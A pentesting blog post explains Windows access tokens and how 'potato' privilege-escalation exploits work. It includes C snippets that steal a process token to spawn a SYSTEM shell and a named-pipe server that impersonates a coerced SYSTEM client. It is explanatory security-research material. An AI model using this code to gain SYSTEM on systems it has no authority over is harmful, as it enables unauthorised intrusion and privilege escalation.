<!doctype html><html lang=en-us><head><title>Windows Access Tokens: Getting SYSTEM and demystifying Potato Exploits // eversinc33</title><link rel="shortcut icon" href=/favicon.ico><meta charset=utf-8><meta name=generator content="Hugo 0.108.0"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="eversinc33"><meta name=description content><link rel=stylesheet href=https://eversinc33.github.io/css/main.min.56496327917020e2615871d48104da92f34d7c476ef1cb3f79a86ca13745a2ab.css><meta name=twitter:card content="summary"><meta name=twitter:title content="Windows Access Tokens: Getting SYSTEM and demystifying Potato Exploits"><meta name=twitter:description content="If you are a penetration tester, you probably dealt with and abused windows access tokens before, e.g. to get SYSTEM privileges, using some kind of potato, from an account with the SeImpersonate privilege set, when using meterpreter&rsquo;s incognito module or when using Cobalt Strike&rsquo;s make_token or revert2self. In the MITRE ATT&CK framework we can find T1134: Access Token Manipulation as a technique, used by many different threat actors.
Although often using tokens and knowing that there are primary and impersonation access tokens, I did not know much about how tokens actually work."><meta property="og:title" content="Windows Access Tokens: Getting SYSTEM and demystifying Potato Exploits"><meta property="og:description" content="If you are a penetration tester, you probably dealt with and abused windows access tokens before, e.g. to get SYSTEM privileges, using some kind of potato, from an account with the SeImpersonate privilege set, when using meterpreter&rsquo;s incognito module or when using Cobalt Strike&rsquo;s make_token or revert2self. In the MITRE ATT&CK framework we can find T1134: Access Token Manipulation as a technique, used by many different threat actors.
Although often using tokens and knowing that there are primary and impersonation access tokens, I did not know much about how tokens actually work."><meta property="og:type" content="article"><meta property="og:url" content="https://eversinc33.github.io/posts/windows-access-tokens/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-11-25T15:50:49+02:00"><meta property="article:modified_time" content="2022-11-25T15:50:49+02:00"></head><body><header class=app-header><a href=https://eversinc33.github.io><img class=app-header-avatar src="https://avatars.githubusercontent.com/u/51821028?v=4" alt=eversinc33></a><h1>eversinc33</h1><p>bits about malware development and penetration testing</p><div class=app-header-social><a href=https://github.com/eversinc33 target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github"><title>My Github</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://twitter.com/eversinc33 target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter"><title>My Twitter</title><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=https://www.linkedin.com/in/sven-rath-4212ba1b8/ target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin"><title>My linkedin</title><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a></div></header><main class=app-container><article class=post><header class=post-header><h1 class=post-title>Windows Access Tokens: Getting SYSTEM and demystifying Potato Exploits</h1><div class=post-meta><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Nov 25, 2022</div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>7 min read</div></div></header><div class=post-content><p>If you are a penetration tester, you probably dealt with and abused windows access tokens before, e.g. to get <code>SYSTEM</code> privileges, using <a href=https://github.com/ohpe/juicy-potato>some kind of potato</a>, from an account with the <code>SeImpersonate</code> privilege set, when using meterpreter&rsquo;s <code>incognito</code> module or when using Cobalt Strike&rsquo;s <code>make_token</code> or <code>revert2self</code>. In the MITRE ATT&CK framework we can find <a href=https://attack.mitre.org/techniques/T1134/>T1134: Access Token Manipulation</a> as a technique, used by many different threat actors.</p><p>Although often using tokens and knowing that there are primary and impersonation access tokens, I did not know much about how tokens <em>actually</em> work. I decided to dig a bit deeper, and learned about various Windows-API calls for access tokens, getting <code>SYSTEM</code> by stealing tokens and how those potatos really work.</p><p>To be able to play around with tokens in a hands-on manner, a few weeks ago, I created a little tool (with a slightly megalomanic name) that can juggle around windows access tokens, which I am gonna use to visualize the techniques below. The tool can be found at <a href=https://github.com/eversinc33/godmode>https://github.com/eversinc33/godmode</a>.</p><p>Windows access tokens are a great subject to learn as a pentester to get involved with windows API programming (aside from the usual process injection calls). At the end of this small post you will hopefully understand the basics of windows access tokens and gain some insight on the inner workings of windows when abusing them.</p><p>I encourage you to implement some of this yourself, if you are interested. Don&rsquo;t use my tool for exploitation, it is just for exploration. If you just want to visualize tokens and play with them, without implementing anything, <a href=https://github.com/diversenok/TokenUniverse>TokenUniverse</a> is a great tool to use. If you want to exploit this, use the tools you have already been using, or the ones I am referencing at the end of the post.</p><h3 id=so-what-are-windows-access-tokens>So what are Windows access tokens?</h3><p>To cite <a href=https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens>MSDN</a>:</p><p><em>An access token is an object that describes the security context of a process or thread.
The information in a token includes the identity and privileges of the user account associated with the process or thread.
When a user logs on [&mldr;] the system produces an access token.
Every process executed on behalf of this user has a copy of this access token.</em></p><p>Basically, access tokens are tokens that are created upon authentication and are then passed along to processes and threads. This makes it possible for the operating system to check whether a process or thread has the rights to access a certain resource.</p><p>There are some additional attributes in a token, e.g. information about ACLs or restricted SIDs, but the above will be enough to understand the techniques explained here. Plus, I am far from being an expert on the topic, so I won&rsquo;t dig too deep.</p><h3 id=primary-vs-impersonation-tokens>Primary vs. Impersonation Tokens</h3><p>When you log on, a primary token is created by the Windows kernel and assigned to your processes. These can be seen as the &ldquo;standard&rdquo; kind of tokens. If you want to create a new process under a user&rsquo;s context, a copy of the primary token needs to be passed along to the new process.</p><p>This primary token can be viewed in process hacker:</p><p><img src=/token.png alt></p><p>If however a thread of a process needs to impersonate a different user (e.g. a server accessing resources for a client), an impersonation token can be set for this thread. This will allow the thread to access resources that the user and the privileges that are described in that impersonation token can access. This is the reason why service accounts often have the <code>SeImpersonate</code> privilege set, while normal users usually should not. Imagine a web server service account, that has to access an MSSQL server on behalf of a user that connects to the service - thats where impersonation comes into play.</p><p>An existing token (primary or impersonation) can be duplicated into either a primary or and impersonation token with the Win32 API function <a href=https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex><code>DuplicateTokenEx</code></a>:</p><p><img src=/msdn.png alt></p><p>By specifying the type in the <code>TokenType</code> parameter we can effectively freely convert between both types.</p><p>The first (ab)use case I want to cover is to escalate from local admin to <code>SYSTEM</code> by stealing access tokens.</p><h3 id=stealing-system-access-tokens>Stealing SYSTEM access tokens</h3><p>A privileged account can copy access tokens from any existing process. This stolen token can then be either applied to an existing process or be used to spawn a new process, e.g. by using <a href><code>CreateProcessWithToken</code></a>. This is all we need to do to get a <code>SYSTEM</code> shell.</p><p>In my tool, this is implemented with the <code>token.cmd</code> command.</p><p>First, all token handles are listed (which is done under the hood by using <code>NtQuerySystemInformation</code> to query all handles and checking if they are token handles). See <a href=https://github.com/eversinc33/godmode/blob/main/token.h#L304>here for the code</a>, as it is a bit too much to show here.</p><p><img src=/tl.png alt></p><p>When the user selects a token, a series of api calls copies the token from the selected process:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/* Error handling is ommited in all code snippets for the sake of brevity*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// open handle to process
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>HANDLE process <span style=color:#f92672>=</span> <span style=color:#a6e22e>OpenProcess</span>(PROCESS_DUP_HANDLE, FALSE, processId);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// duplicate the handle, where handleInfo.HandleValue is the token handle
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>HANDLE dupHandle;
</span></span><span style=display:flex><span><span style=color:#a6e22e>DuplicateHandle</span>(process, (HANDLE)handleInfo.HandleValue, <span style=color:#a6e22e>GetCurrentProcess</span>(), <span style=color:#f92672>&amp;</span>dupHandle, <span style=color:#ae81ff>0</span>, FALSE, DUPLICATE_SAME_ACCESS)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// duplicate the token, need to specify either TokenImpersonation or TokenPrimary as the fifth argument
</span></span></span><span style=display:flex><span><span style=color:#75715e>// the type can be enumerated with GetTokenInformation,
</span></span></span><span style=display:flex><span><span style=color:#75715e>// see: https://github.com/eversinc33/godmode/blob/main/token.h#L250
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>DuplicateTokenEx</span>(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, <span style=color:#f92672>&amp;</span>pNewToken)
</span></span></code></pre></div><p>Finally, a new <code>cmd</code> process is spawned with this token as its primary token, using the <code>CreateProcessWithTokenW</code> API. Note that this part requires an enabled <code>SeImpersonatePrivilege</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>STARTUPINFO si;
</span></span><span style=display:flex><span>PROCESS_INFORMATION pi;
</span></span><span style=display:flex><span><span style=color:#a6e22e>CreateProcessWithTokenW</span>(pNewToken, LOGON_NETCREDENTIALS_ONLY, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>system32</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>cmd.exe&#34;</span>, NULL, CREATE_NEW_CONSOLE, NULL, NULL, <span style=color:#f92672>&amp;</span>si, <span style=color:#f92672>&amp;</span>pi)
</span></span></code></pre></div><p>This results in a shell with the same security context as the process of which we duplicated the token:</p><p><img src=/list.png alt></p><p>So far so good, but what if we do not have a privileged account?</p><h3 id=token-impersonation-and-potato-exploits>Token Impersonation and Potato Exploits</h3><p>Remember when I talked about impersonation tokens earlier? A process can impersonate another processes token, when the <code>SeImpersonatePrivilege</code> is enabled. You know what happens next if you see that privilege enabled on a compromised account: whip out a potato and get <code>SYSTEM</code>. But what is actually happening there?</p><p>Turns out that a named pipe server can impersonate any client that connects to its named pipe, when <code>SeImpersonatePrivilege</code> is enabled. This is what the windows api <a href=https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient><code>ImpersonateNamedPipeClient</code></a> is for. Basically, all the potato exploits rely upon tricking a <code>SYSTEM</code> process into connecting to a named pipe controlled by the compromised account to then impersonate the connection. What differs mostly, is the way that authentication is triggered. For an awesome overview, check out <a href=https://jlajara.gitlab.io/Potatoes_Windows_Privesc>this great blog post</a> by Jorge Lajara.</p><p>The implementation of impersonation of a named pipe itself is simple. As above, error handling is removed here for brevity:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>SECURITY_ATTRIBUTES sa;
</span></span><span style=display:flex><span>STARTUPINFOW si;
</span></span><span style=display:flex><span>PROCESS_INFORMATION pi;
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>256</span>] <span style=color:#f92672>=</span> { <span style=color:#ae81ff>0</span> };
</span></span><span style=display:flex><span>DWORD dwRead <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>DWORD bytesToRead <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>LPWSTR pipeName <span style=color:#f92672>=</span> <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>.</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>pipe</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>spoolss&#34;</span>; <span style=color:#75715e>// this pipe needs to be renamed, depending on the coercion method used
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// setup named pipe
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>InitializeSecurityDescriptor</span>(<span style=color:#f92672>&amp;</span>sa, SECURITY_DESCRIPTOR_REVISION)
</span></span><span style=display:flex><span><span style=color:#a6e22e>ConvertStringSecurityDescriptorToSecurityDescriptor</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;D:(A;OICI;GA;;;WD)&#34;</span>, SDDL_REVISION_1, <span style=color:#f92672>&amp;</span>((<span style=color:#f92672>&amp;</span>sa)<span style=color:#f92672>-&gt;</span>lpSecurityDescriptor), NULL)
</span></span><span style=display:flex><span>HANDLE hPipe <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateNamedPipeW</span>(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE <span style=color:#f92672>|</span> PIPE_READMODE_BYTE <span style=color:#f92672>|</span> PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, <span style=color:#ae81ff>256</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#ae81ff>256</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), NMPWAIT_USE_DEFAULT_WAIT, <span style=color:#f92672>&amp;</span>sa);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// wait for the connection
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>ConnectNamedPipe</span>(hPipe, NULL)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*] Got connection!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// read from pipe and impersonate client
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>PeekNamedPipe</span>(hPipe, <span style=color:#f92672>&amp;</span>buffer, (<span style=color:#ae81ff>256</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>char</span>), <span style=color:#f92672>&amp;</span>dwRead, <span style=color:#f92672>&amp;</span>bytesToRead, NULL)
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>ImpersonateNamedPipeClient</span>(hPipe)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// open the current threads token
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    HANDLE hToken;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>OpenThreadToken</span>(<span style=color:#a6e22e>GetCurrentThread</span>(), MAXIMUM_ALLOWED, TRUE, <span style=color:#f92672>&amp;</span>hToken)) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// duplicate token and save a reference in pNewToken
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        HANDLE pNewToken;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>DuplicateTokenEx</span>(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, <span style=color:#f92672>&amp;</span>pNewToken)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Revert to self to re-gain SeImpersonate priv
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>RevertToSelf</span>();
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e>// start a process with our clients token
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        STARTUPINFO si2;
</span></span><span style=display:flex><span>        PROCESS_INFORMATION pi2;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>CreateProcessWithTokenW</span>(pNewToken, <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Windows</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>system32</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>cmd.exe&#34;</span>, NULL, CREATE_NEW_CONSOLE, NULL, NULL, <span style=color:#f92672>&amp;</span>si2, <span style=color:#f92672>&amp;</span>pi2)) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[!] ERROR: Could not create process with token: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>GetLastError</span>());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Since for this example I will be using the printer bug (as implemented by <a href=https://github.com/leechristensen/SpoolSample>https://github.com/leechristensen/SpoolSample</a>) to coerce <code>SYSTEM</code> to authenticate to my pipe, I had to specify the pipe name <code>\\\\.\\pipe\\spoolss</code>, since this is what <code>MS-RPRN</code>, Microsofts <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1?redirectedfrom=MSDN">Print System Remote Protocol</a>, connects to.</p><p>Now we have all we need to get a <code>SYSTEM</code> shell using token impersonation:</p><p><img src=/spools.png alt></p><p>We effectively have created an (immature) malleable potato, where the trigger can be freely chosen.</p><p>Of course I am not the first one with that came up with this. I know of at least two repositories that have this implemented in a much more weaponized way, namely <a href=https://twitter.com/micahvandeusen>@micahvandeusen</a> with <a href=https://github.com/micahvandeusen/GenericPotato>https://github.com/micahvandeusen/GenericPotato</a> and <a href=https://twitter.com/ShitSecure>@s3cur3th1ssh1t</a> with <a href=https://github.com/S3cur3Th1sSh1t/MultiPotato>https://github.com/S3cur3Th1sSh1t/MultiPotato</a>. Use these tools for active exploitation instead.</p><h3 id=what-else>What else?</h3><p>There are other token manipulation techniques and other privileges that can be exploited to escalate privileges. A short overview on this can be viewed over at <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>HackTricks</a> and many infos can be found all over the internet. The point here is not to list a comprehensive list of token manipulation techniques, but to mainly document my learnings here for myself and hopefully encourage you to try this stuff out yourself.</p><p>Happy Hacking!</p><h5 id=references--credits>References & Credits</h5><ul><li><a href=https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens>https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens</a></li><li><a href=https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html>https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html</a></li><li><a href=https://github.com/diversenok/TokenUniverse>https://github.com/diversenok/TokenUniverse</a></li><li><a href=https://jlajara.gitlab.io/Potatoes_Windows_Privesc>https://jlajara.gitlab.io/Potatoes_Windows_Privesc</a></li><li><a href=https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/>https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></li><li><a href=https://github.com/sensepost/impersonate>https://github.com/sensepost/impersonate</a></li><li><a href=https://github.com/S3cur3Th1sSh1t/MultiPotato>https://github.com/S3cur3Th1sSh1t/MultiPotato</a></li><li><a href=https://github.com/micahvandeusen/GenericPotato>https://github.com/micahvandeusen/GenericPotato</a></li></ul></div><div class=post-footer></div></article></main></body></html>